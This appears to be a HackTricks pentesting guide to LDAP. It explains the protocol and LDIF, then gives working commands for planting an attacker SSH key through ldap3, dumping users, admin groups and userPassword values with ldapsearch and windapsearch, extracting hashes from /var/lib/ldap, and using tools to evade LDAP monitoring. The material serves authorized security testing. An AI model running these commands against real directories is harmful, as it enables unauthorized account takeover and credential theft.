# 389, 636, 3268, 3269 - Pentesting LDAP

{#include ../../../../../home/runner/work/HackTricks-Feed/HackTricks-Feed/src/banners/hacktricks-training.md}

The use of **LDAP** (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

LDAP directories are structured to allow their distribution across several servers, with each server housing a **replicated** and **synchronized** version of the directory, referred to as a Directory System Agent (DSA). Responsibility for handling requests lies entirely with the LDAP server, which may communicate with other DSAs as needed to deliver a unified response to the requester.

The LDAP directory's organization resembles a **tree hierarchy, starting with the root directory at the top**. This branches down to countries, which further divide into organizations, and then to organizational units representing various divisions or departments, finally reaching the individual entities level, including both people and shared resources like files and printers.

**Default port:** 389 and 636(ldaps). Global Catalog (LDAP in ActiveDirectory) is available by default on ports 3268, and 3269 for LDAPS.

```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```

### LDAP Data Interchange Format

LDIF (LDAP Data Interchange Format) defines the directory content as a set of records. It can also represent update requests (Add, Modify, Delete, Rename).

```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```

- Lines 1-3 define the top level domain local
- Lines 5-8 define the first level domain moneycorp (moneycorp.local)
- Lines 10-16 define 2 organizational units: dev and sales
- Lines 18-26 create an object of the domain and assign attributes with values

## Write data

Note that if you can modify values you could be able to perform really interesting actions. For example, imagine that you **can change the "sshPublicKey" information** of your user or any user. It's highly probable that if this attribute exist, then **ssh is reading the public keys from LDAP**. If you can modify the public key of a user you **will be able to login as that user even if password authentication is not enabled in ssh**.

```bash
# Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```

## Sniff clear text credentials

If LDAP is used without SSL you can **sniff credentials in plain text** in the network.

Also, you can perform a **MITM** attack in the network **between the LDAP server and the client.** Here you can make a **Downgrade Attack** so the client with use the **credentials in clear text** to login.

**If SSL is used** you can try to make **MITM** like the mentioned above but offering a **false certificate**, if the **user accepts it**, you are able to Downgrade the authentication method and see the credentials again.

## Anonymous Access

### Bypass TLS SNI check

According to [**this writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) just by accessing the LDAP server with an arbitrary domain name (like company.com) he was able to contact the LDAP service and extract information as an anonymous user:

```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```

### LDAP anonymous binds

[LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) allow **unauthenticated attackers** to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a **legacy configuration**, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests.\
However, admins may have needed to **set up a particular application to allow anonymous binds** and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.

## Valid Credentials

If you have valid credentials to login into the LDAP server, you can dump all the information about the Domain Admin using:

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)

```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```

### [Brute Force](../generic-hacking/brute-force.md#ldap)

## Enumeration

### Automated

Using this you will be able to see the **public information** (like the domain name)**:**

```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```

### Python

<details>

<summary>See LDAP enumeration with python</summary>

You can try to **enumerate a LDAP with or without credentials using python**: `pip3 install ldap3`

First try to **connect without** credentials:

```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```

If the response is `True` like in the previous example, you can obtain some **interesting data** of the LDAP (like the **naming context** or **domain name**) server from:

```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```

Once you have the naming context you can make some more exciting queries. This simply query should show you all the objects in the directory:

```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```

Or **dump** the whole ldap:

```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch) is a Python script useful to **enumerate users, groups, and computers from a Windows** domain by utilizing LDAP queries.

```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```

### ldapsearch

Check null credentials or if your credentials are valid:

```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v3839
```

If you find something saying that the "_bind must be completed_" means that the credentials are incorrect.

You can extract **everything from a domain** using:

```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```

Extract **users**:

```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```

Extract **computers**:

```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **my info**:

```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Domain Admins**:

```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Domain Users**:

```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Enterprise Admins**:

```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Administrators**:

```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Remote Desktop Group**:

```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

To see if you have access to any password you can use grep after executing one of the queries:

```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```

Please, notice that the passwords that you can find here could not be the real ones...

### Godap

Godap is an interactive terminal user interface for LDAP that can be used to interact with objects and attributes in AD and other LDAP servers. It is available for Windows, Linux and MacOS and supports simple binds, pass-the-hash, pass-the-ticket & pass-the-cert, along with several other specialized features such as searching/creating/changing/deleting objects, adding/removing users from groups, changing passwords, editing object permissions (DACLs), modifying Active-Directory Integrated DNS (ADIDNS), exporting to JSON files, etc.

![](../images/godap.png)

You can access it in [https://github.com/Macmod/godap](https://github.com/Macmod/godap). For usage examples and instructions read the [Wiki](https://github.com/Macmod/godap/wiki).

### Ldapx

Ldapx is a flexible LDAP proxy that can be used to inspect & transform LDAP traffic from other tools. It can be used to obfuscate LDAP traffic to attempt to bypass identity protection & LDAP monitoring tools and implements most of the methods presented in the [MaLDAPtive](https://www.youtube.com/watch?v=mKRS5Iyy7Qo) talk.

![](../images/ldapx.png)

You can get it from [https://github.com/Macmod/ldapx](https://github.com/Macmod/ldapx).

## Authentication via kerberos

Using `ldapsearch` you can **authenticate** against **kerberos instead** of via **NTLM** by using the parameter `-Y GSSAPI`

## POST

If you can access the files where the databases are contained (could be in _/var/lib/ldap_). You can extract the hashes using:

```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```

You can feed john with the password hash (from '{SSHA}' to 'structural' without adding 'structural').
